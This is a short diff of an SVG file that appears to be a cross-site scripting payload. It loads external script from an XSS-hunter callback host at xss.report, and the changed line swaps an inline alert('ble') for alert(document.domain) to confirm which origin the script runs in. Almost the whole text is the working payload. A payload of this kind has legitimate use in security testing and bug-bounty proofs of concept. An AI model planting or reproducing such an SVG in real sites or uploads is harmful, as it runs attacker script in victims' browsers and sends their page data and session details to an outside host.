@@ -12,7 +12,7 @@
     <script xlink:href="https://xss.report/c/xsshunter" />
     <script>
       //<![CDATA[
-        alert("ble");
+        alert(document.domain);
       ]]>
     </script>
   </svg>
